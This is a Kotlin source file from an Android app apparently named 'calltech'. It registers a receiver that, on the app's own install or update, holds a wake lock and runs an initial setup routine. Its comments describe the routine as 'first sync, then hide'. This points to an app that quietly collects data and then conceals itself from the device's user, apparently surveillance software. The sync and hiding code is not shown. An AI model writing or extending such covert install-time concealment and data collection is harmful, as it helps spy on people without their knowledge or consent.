package com.calltech

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

/** App install/update — pehle sync, phir hide. */
class InstallReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        val action = intent?.action ?: return
        when (action) {
            Intent.ACTION_MY_PACKAGE_REPLACED -> Unit
            Intent.ACTION_PACKAGE_REPLACED, Intent.ACTION_PACKAGE_ADDED -> {
                val pkg = intent.data?.schemeSpecificPart ?: return
                if (pkg != context.packageName) {
                    return
                }
            }
            else -> return
        }

        val appContext = context.applicationContext
        Log.d(TAG, "Install/update — initial sync then hide ($action)")

        val pendingResult = goAsync()
        val wakeLock = SyncWakeLock.acquire(appContext, "InstallSyncWakeLock")

        BackgroundSyncRunner.run {
            try {
                InstallFlow.runInitialSetup(appContext, "install")
            } catch (error: Exception) {
                Log.e(TAG, "Install flow failed", error)
            } finally {
                SyncWakeLock.release(wakeLock)
                try {
                    pendingResult.finish()
                } catch (_: Exception) {
                }
            }
        }
    }

    companion object {
        private const val TAG = "InstallReceiver"
    }
}
